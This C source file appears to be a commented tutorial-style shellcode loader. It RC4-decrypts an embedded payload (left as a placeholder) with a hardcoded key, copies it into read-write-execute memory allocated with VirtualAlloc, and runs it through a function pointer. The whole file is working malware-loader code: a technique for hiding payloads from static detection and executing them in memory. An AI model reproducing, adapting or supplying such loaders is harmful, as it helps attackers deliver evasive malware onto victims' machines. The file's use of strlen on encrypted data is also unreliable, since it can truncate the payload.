// decrypt.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//required for the interaction of Windows APIs for execution of shellcode
#include <Windows.h>
#include <memory.h>


//See the Rc4-encrypt.c file for an explanation of the structures and prototypes

typedef struct {
    unsigned int i;
    unsigned int j;
    unsigned char s[256];
} Rc4Context;


//
typedef void (*ShellcodeFunction)(void);

void rc4Init(Rc4Context* context, const unsigned char* key, size_t length);
void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length);

// This is where we would place our shellcode to be executed
unsigned char shellcode[] = {
    "Place payload here"
};

// As noted in the encrypt.c file, there are multiple key formats which can be used.
// Ensure key is the same as what is used in the encrypt.c file
unsigned char key[] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
};

int main() {
    Rc4Context ctx = { 0 };
    rc4Init(&ctx, key, sizeof(key));

    unsigned char* PlainText = (unsigned char*)malloc(strlen(shellcode) * sizeof(int));
    ZeroMemory(PlainText, strlen(shellcode) * sizeof(int));
    rc4Cipher(&ctx, shellcode, PlainText, strlen(shellcode));

    // for debugging
    printf("[i] PlainText : \"%s\" \n", (char*)PlainText);

    //To execute our decrypted payload:
    
    // LPVOID long pointer
    /* VirtualAlloc API where the first argument is the address of the region.When set to 0 the
    function will determine the address. The second argument strlen(shellcode) is the amount of
    memory to commit, MEM_COMMIT commits the specified region of pages to physical memory
    PAGE_EXECUTE_READWRITE sets the memory protections*/

    LPVOID execMem = VirtualAlloc(0, strlen(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (execMem == NULL) 
        { 
            // Handle allocation failure
            free(PlainText);
            return 1;
        }

    // Copies the decrypted shellcode from PlainText to the executable space of memory we made in execMem
    memcpy(execMem, PlainText, strlen(shellcode));


    ShellcodeFunction shellcodeFunc = (ShellcodeFunction)execMem;

    //Invoked the function pointed to be ShellcodeFunc
    shellcodeFunc();

    //Free the allocated memory
    VirtualFree(execMem, 0, MEM_RELEASE);
    free(PlainText);
    return 0;
}
